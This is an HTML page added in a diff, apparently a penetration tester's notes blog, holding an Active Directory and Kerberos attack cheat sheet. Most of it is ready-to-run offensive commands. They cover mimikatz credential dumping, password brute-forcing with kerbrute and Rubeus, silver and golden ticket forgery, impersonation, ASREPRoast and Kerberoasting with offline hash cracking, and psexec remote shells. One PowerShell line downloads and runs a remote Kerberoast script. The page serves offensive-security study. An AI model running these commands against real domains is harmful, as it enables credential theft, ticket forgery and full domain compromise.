@@ -1,0 +1,647 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - Active Directory/Kerberos // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - Active Directory/Kerberos"/>
+<meta name="twitter:description" content="cheatsheet Kerberos cheatsheet: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a Tools AD attacks cheatsheet: https://wadcoms.github.io/ Ghostpack: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries PowerSharkPack: https://github.com/S3cur3Th1sSh1t/PowerSharpPack # Each script is stored in gzip &#43; base64 format &gt; base64 -d &lt;b64-strings&gt; &gt; gzip -d file.gz bloodhound # setup &gt; apt install bloodhound neo4j &gt; python3 -m pip install bloodhound # run, default pass `neo4j:neo4j` &gt; neo4j console &gt; bloodhound --no-sandbox # clear db in neo4j &gt; match (a) -[r] -&gt; () delete a, r &gt; match (a) delete a # bloodhound domain enum &gt; bloodhound-python -d {domain} -u &lt;user&gt; -p &lt;pass&gt; -dc &lt;dc-ip&gt; -c all -ns &lt;target-ns&gt; &gt; SharpHound."/>
+
+    <meta property="og:title" content="Notes - Active Directory/Kerberos" />
+<meta property="og:description" content="cheatsheet Kerberos cheatsheet: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a Tools AD attacks cheatsheet: https://wadcoms.github.io/ Ghostpack: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries PowerSharkPack: https://github.com/S3cur3Th1sSh1t/PowerSharpPack # Each script is stored in gzip &#43; base64 format &gt; base64 -d &lt;b64-strings&gt; &gt; gzip -d file.gz bloodhound # setup &gt; apt install bloodhound neo4j &gt; python3 -m pip install bloodhound # run, default pass `neo4j:neo4j` &gt; neo4j console &gt; bloodhound --no-sandbox # clear db in neo4j &gt; match (a) -[r] -&gt; () delete a, r &gt; match (a) delete a # bloodhound domain enum &gt; bloodhound-python -d {domain} -u &lt;user&gt; -p &lt;pass&gt; -dc &lt;dc-ip&gt; -c all -ns &lt;target-ns&gt; &gt; SharpHound." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/notes/3a-ad/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-08T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-08T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Notes - Active Directory/Kerberos</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 8, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          15 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="cheatsheet">cheatsheet</h1>
+<ul>
+<li>Kerberos cheatsheet: <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</a></li>
+</ul>
+<h1 id="tools">Tools</h1>
+<ul>
+<li>AD attacks cheatsheet: <a href="https://wadcoms.github.io/">https://wadcoms.github.io/</a></li>
+<li>Ghostpack: <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></li>
+<li>PowerSharkPack: <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">https://github.com/S3cur3Th1sSh1t/PowerSharpPack</a></li>
+</ul>
+<pre tabindex="0"><code># Each script is stored in gzip + base64 format
+&gt; base64 -d &lt;b64-strings&gt;
+&gt; gzip -d file.gz
+</code></pre><h2 id="bloodhound">bloodhound</h2>
+<pre tabindex="0"><code># setup
+&gt; apt install bloodhound neo4j
+&gt; python3 -m pip install bloodhound
+
+# run, default pass `neo4j:neo4j`
+&gt; neo4j console
+&gt; bloodhound --no-sandbox
+
+# clear db in neo4j
+&gt; match (a) -[r] -&gt; () delete a, r
+&gt; match (a) delete a
+
+# bloodhound domain enum
+&gt; bloodhound-python -d {domain} -u &lt;user&gt; -p &lt;pass&gt; -dc &lt;dc-ip&gt; -c all -ns &lt;target-ns&gt;
+&gt; SharpHound.exe -c All --zipfilename output.zip
+</code></pre><h2 id="impacket-setup">Impacket setup</h2>
+<pre tabindex="0"><code># updated to the latest impacket (remove the old one)
+&gt; apt remove --purge impacket-scripts python3-impacket
+&gt; apt autoremove
+
+# Install:
+&gt; git clone https://github.com/SecureAuthCorp/impacket.git
+&gt; cd impacket
+&gt; python3 setup.py install
+</code></pre><h2 id="mimikatz">mimikatz</h2>
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></li>
+<li>2.1.1 (win10 compatible): <a href="https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip">https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Run interactively</span>
+</span></span><span style="display:flex;"><span>mimikatz.exe
+</span></span><span style="display:flex;"><span>privilege::debug
+</span></span><span style="display:flex;"><span>sekurlsa::logonpasswords full
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run oneliner</span>
+</span></span><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonpasswords full&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span></code></pre></div><h2 id="powerview">PowerView</h2>
+<ul>
+<li>PowerSploit: <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Get all domain `computers`</span>
+</span></span><span style="display:flex;"><span>Get-DomainComputer | % {Resolve-IPAddress -ComputerName $_.cn}
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get all domain `users`</span>
+</span></span><span style="display:flex;"><span>Get-NetUser
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get domain `admins`</span>
+</span></span><span style="display:flex;"><span>Get-DomainGroupMember -identity <span style="color:#e6db74">&#34;Domain Admins&#34;</span> -Domain xor.com -DomainController &lt;ip&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get domain `shares`</span>
+</span></span><span style="display:flex;"><span>Find-DomainShare -CheckShareAccess -Domain xor.com -DomainController &lt;ip&gt;
+</span></span></code></pre></div><h1 id="kerberos-auth-flow">Kerberos auth flow</h1>
+<pre tabindex="0"><code>1a. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request (AS-REQ).
+1b. The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) &amp; creates Ticket-Granting Ticket (TGT).
+
+2. The TGT is encrypted, signed, &amp; delivered to the user (AS-REP).Only the Kerberos service (KRBTGT) in the domain can open and read TGT data
+
+      User                                                                                      KDC
+
+  (preauthentication)
+ntlm = hash(password)                       ------ AS-REQ (TGT Req) ------&gt;    Check user info/restrictions/groups
+authenticator = hash(timestamp, ntlm)       &lt;----- AS-REP (TGT Rep) -------     encrypt+sign(TGT, krbtgt)
+Receives: TGT (encrypt+sign by krbtgt)
+
+
+3. The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT &amp; validates PAC checksum – If the DC can open the ticket &amp; the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket
+4. The TGS is encrypted using the target service accounts’ NTLM password hash and sent to the user (TGS-REP).
+
+      User                                                                                      KDC
+
+       TGT                                   -------- TGS-REQ ------------&gt;           Validate &amp; decrypt TGT
+                                             &lt;------- TGS-REP -------------           encrypt(TGS, target_service_ntlm)
+Receives: TGS (encrypt+sign by target service)                                        If unconstrained delegation enabled
+                                                                                      a copy of the TGT is inserted into the TGS
+
+
+5. The user connects to the server hosting the service on the appropriate port &amp; presents the TGS (AP-REQ). The service opens the TGS ticket using its NTLM password hash.
+
+      User                                                                                   Service
+      TGS                                    ----------- AP-REQ -----------&gt;           Validate &amp; descrypt TGS
+                                                                                       If unconstrained delegation enabled
+                                                                                       service opens the TGS and saves the user&#39;s
+                                                                                       TGT in LSASS for impersonation usage
+</code></pre><h1 id="common-kerberos-attacks">Common Kerberos Attacks</h1>
+<h2 id="kerbrute-for-brute-forcing-discovery-of-users-passwords">kerbrute for brute forcing discovery of users, passwords</h2>
+<ul>
+<li><a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></li>
+<li><a href="https://github.com/Sq00ky/attacktive-directory-tools">https://github.com/Sq00ky/attacktive-directory-tools</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; kerbrute userenum -d {domain_name} --dc {dc_ip} userlist.tx
+
+# with a list of users
+&gt; .\Rubeus.exe brute /users:&lt;users_file&gt; /passwords:&lt;passwords_file&gt; /domain:&lt;domain_name&gt; /outfile:&lt;output_file&gt;
+
+# check passwords for all users in current domain
+&gt; .\Rubeus.exe brute /passwords:&lt;passwords_file&gt; /outfile:&lt;output_file&gt;
+</code></pre><h2 id="silver-ticket-st">Silver Ticket (ST)</h2>
+<ul>
+<li>Concept: The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user.</li>
+<li>linux</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># using impacket</span>
+</span></span><span style="display:flex;"><span>&gt; impacket-getTGT &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;
+</span></span><span style="display:flex;"><span>&gt; impacket-getST -dc-ip &lt;domain&gt; -spn cifs/&lt;domain-dc&gt; <span style="color:#e6db74">&#39;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># using ticketer</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## To generate the TGS with NTLM</span>
+</span></span><span style="display:flex;"><span>python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## To generate the TGS with AES key</span>
+</span></span><span style="display:flex;"><span>python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use ticket</span>
+</span></span><span style="display:flex;"><span>&gt; export KRB5CCNAME<span style="color:#f92672">=</span>&lt;ccache&gt;
+</span></span></code></pre></div><ul>
+<li>windows</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># To generate the TGS with NTLM</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To generate the TGS with AES 128 key</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject TGS with Mimikatz</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::ptt &lt;ticket_kirbi_file&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject ticket with Rubeus:</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>&lt;ticket_kirbi_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute a cmd in the remote machine with PsExec:</span>
+</span></span><span style="display:flex;"><span>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
+</span></span></code></pre></div><ul>
+<li>If encountered <code>KRB_AP_ERR_SKEW</code>, that means your machine is out of sync with the dc&rsquo;s time</li>
+</ul>
+<pre tabindex="0"><code># Disable auto sync and update with the target dc
+&gt; timedatectl set-ntp false
+&gt; ntpdate -s &lt;target-dc&gt;
+</code></pre><h2 id="impersonation">Impersonation</h2>
+<ul>
+<li>When compromised a host or account with some form of delegation rights configured.</li>
+<li>SPN must match one of the SPN&rsquo;s the supplied account is authorized to perform delegation against.</li>
+</ul>
+<pre tabindex="0"><code># Impersonate as Administrator, the uid is 500 by convention
+&gt; getST.py -spn &lt;spn&gt;/&lt;dc&gt; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&#39; -impersonate Administrator -dc-ip &lt;dc-ip&gt;
+&gt; export KRB5CCNAME=Administrator.ccache
+
+# Connect to mssql via the impersonated ticket
+&gt; mssqlclient.py &lt;domain&gt; -k
+</code></pre><h2 id="golden-ticket">Golden Ticket</h2>
+<ul>
+<li>Concept: A valid TGT as any user can be created using the NTLM hash of the krbtgt AD account. The advantage of forging a TGT instead of TGS is being able to access any service (or machine) in the domain and the impersonated user.
+Moreover the credentials of krbtgt are never changed automatically.</li>
+</ul>
+<pre tabindex="0"><code># Benefits
+* PE between two domains with configured trust relationships.
+* Remain valid even if a users password expires or is changed
+* To invalidate a Golden Ticket, need to change the krbtgt users password twice
+
+# Pre-requisite
+* NTLM hash of krbtgt user
+* SID of target Domain
+</code></pre><ul>
+<li>linux</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># To get the domain SID</span>
+</span></span><span style="display:flex;"><span>&gt; lookupsid.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;dc-ip&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Kerberos works with SIDs and not SAM usernames, the supplied username can be anything we like, even if the user does not exist</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># By default, the forged ticket will contain SIDs for the following groups - 513, 512, 520, 518, 519. However, an alternative list of groups can be specified using -groups</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Additional Domain SIDs can be specified using the -extra-sid flag, which is useful for pivoting across domain trusts.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># NTLM hash can be generated using: https://codebeautify.org/ntlm-hash-generator</span>
+</span></span><span style="display:flex;"><span>&gt; ticketer.py -nthash &lt;ntlm&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; &lt;fake-user&gt; <span style="color:#75715e"># &lt;fake-user&gt; can be arbitrary, usually Administrator</span>
+</span></span><span style="display:flex;"><span>&gt; ticketer.py -nthash &lt;ntlm&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; -user-id <span style="color:#ae81ff">500</span> Administrator -spn &lt;spn&gt;/&lt;domain&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># use the ticket</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>&lt;fake-user&gt;.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># use psexec.py to pop a shell as the non-existent user &lt;fake-user&gt; on any host in the Domain for which the SID was provided</span>
+</span></span><span style="display:flex;"><span>&gt; psexec.py &lt;domain&gt;/&lt;fake-user&gt;@&lt;dc&gt; -k -no-pass -dc-ip &lt;dc-ip&gt; -target-ip &lt;target-ip&gt;
+</span></span></code></pre></div><ul>
+<li>windows</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># To generate the TGT with NTLM</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To generate the TGT with AES 128 key</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject TGT with Mimikatz</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::ptt &lt;ticket_kirbi_file&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject ticket with Rubeus:</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>&lt;ticket_kirbi_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute a cmd in the remote machine with PsExec:</span>
+</span></span><span style="display:flex;"><span>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
+</span></span></code></pre></div><h2 id="asreproast">ASREPRoast</h2>
+<ul>
+<li>The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).</li>
+<li>That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># check ASREPRoast for all domain users (credentials required)</span>
+</span></span><span style="display:flex;"><span>python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format <span style="color:#f92672">[</span>hashcat | john<span style="color:#f92672">]</span>&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># check ASREPRoast for a list of users (no credentials required)</span>
+</span></span><span style="display:flex;"><span>python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format <span style="color:#f92672">[</span>hashcat | john<span style="color:#f92672">]</span>&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># check ASREPRoast for all users in current domain</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe asreproast  /format<span style="color:#960050;background-color:#1e0010">:</span>&lt;AS_REP_responses_format [hashcat | john]&gt; /outfile<span style="color:#960050;background-color:#1e0010">:</span>&lt;output_hashes_file&gt;
+</span></span></code></pre></div><ul>
+<li>Ticket cracking</li>
+</ul>
+<pre tabindex="0"><code>hashcat -m 18200 -a 0 &lt;AS_REP_responses_file&gt; &lt;passwords_file&gt;
+john --wordlist=&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;
+</code></pre><h2 id="kerberoasting">Kerberoasting</h2>
+<ul>
+<li>Concept
+<ul>
+<li>Kerberos tickets are encrypted with the NTLM hash of the SPN for which they are requested.</li>
+<li>SPN&rsquo;s in Active Directory are often tied to user accounts to allow services such as Databases or Web Servers to access resources based upon permissions configured for Active Directory users.</li>
+<li>The plaintext of the Kerberos ticket is known to the entity which requests it. As a result, it is possible to request Kerberos tickets for services that are configured with SPN&rsquo;s tied to user accounts and perform a brute-force attack to figure out what password was used to encrypt the ticket.</li>
+<li>In many instances, SPN&rsquo;s will be tied to an over-privileged Active Directory accounts. Typically due to SPN&rsquo;s being automatically configured by applications to have Administrative permissions, or system administrators deploying services where the required permissions are unknown so they just give the service Administrator permissions.</li>
+</ul>
+</li>
+<li>If on the host</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Enumerate Kerberoastable users</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1) PowerView</span>
+</span></span><span style="display:flex;"><span>&gt; Import-Module .\PowerView.ps1
+</span></span><span style="display:flex;"><span>&gt; Get-NetUser -SPN | select serviceprincipalname
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2) setspn</span>
+</span></span><span style="display:flex;"><span>&gt; setspn.exe -T xor -Q */*
+</span></span><span style="display:flex;"><span>&gt; setspn.exe -T &lt;domain&gt; -Q */* | Select-String <span style="color:#e6db74">&#39;^CN&#39;</span> -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3) Rubeus</span>
+</span></span><span style="display:flex;"><span>&gt; .\Rubeus.exe kerberosat /stats
+</span></span></code></pre></div><ul>
+<li>Technique 1: Ask for TGS and dump it from memory</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Get TGS in memory from a single user</span>
+</span></span><span style="display:flex;"><span>Add-Type -AssemblyName System.IdentityModel 
+</span></span><span style="display:flex;"><span>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span style="color:#e6db74">&#34;&lt;spn&gt;&#34;</span> <span style="color:#75715e">#Example: MSSQLSvc/mgmt.domain.local </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)</span>
+</span></span><span style="display:flex;"><span>setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String <span style="color:#e6db74">&#39;^CN&#39;</span> -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List kerberos tickets in memory</span>
+</span></span><span style="display:flex;"><span>klist
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extract them from memory</span>
+</span></span><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;kerberos::list /export&#34;&#39;</span> <span style="color:#75715e">#Export tickets to current folder</span>
+</span></span></code></pre></div><ul>
+<li>Technique 2: Automatic tools</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Powerview: Get Kerberoast hash of a user</span>
+</span></span><span style="display:flex;"><span>Request-SPNTicket -SPN <span style="color:#e6db74">&#34;&lt;SPN&gt;&#34;</span> -Format Hashcat <span style="color:#75715e">#Using PowerView Ex: MSSQLSvc/mgmt.domain.local</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Powerview: Get all Kerberoast hashes</span>
+</span></span><span style="display:flex;"><span>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rubeus</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe kerberoast /outfile<span style="color:#960050;background-color:#1e0010">:</span>hashes.kerberoast
+</span></span><span style="display:flex;"><span>.\Rubeus.exe kerberoast /user<span style="color:#960050;background-color:#1e0010">:</span>svc_mssql /outfile<span style="color:#960050;background-color:#1e0010">:</span>hashes.kerberoast <span style="color:#75715e">#Specific user</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe kerberoast /ldapfilter<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;admincount=1&#39;</span> /nowrap <span style="color:#75715e">#Get of admins</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Invoke-Kerberoast</span>
+</span></span><span style="display:flex;"><span>iex (new-object Net.WebClient).DownloadString(<span style="color:#e6db74">&#34;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#34;</span>)
+</span></span><span style="display:flex;"><span>Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+</span></span></code></pre></div><ul>
+<li>Ticket cracking</li>
+</ul>
+<pre tabindex="0"><code># Transform kirbi ticket to john
+&gt; kirbi2john ticket.kirbi &gt; ticket.john
+* kirbi2hashcat: https://raw.githubusercontent.com/jarilaos/kirbi2hashcat/master/kirbi2hashcat.py
+
+# Transform john to hashcat
+&gt; sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; ticket_tgs_hashcat
+
+# Cracking tools
+&gt; john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+&gt; hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+</code></pre><h1 id="tickets-handling">Tickets handling</h1>
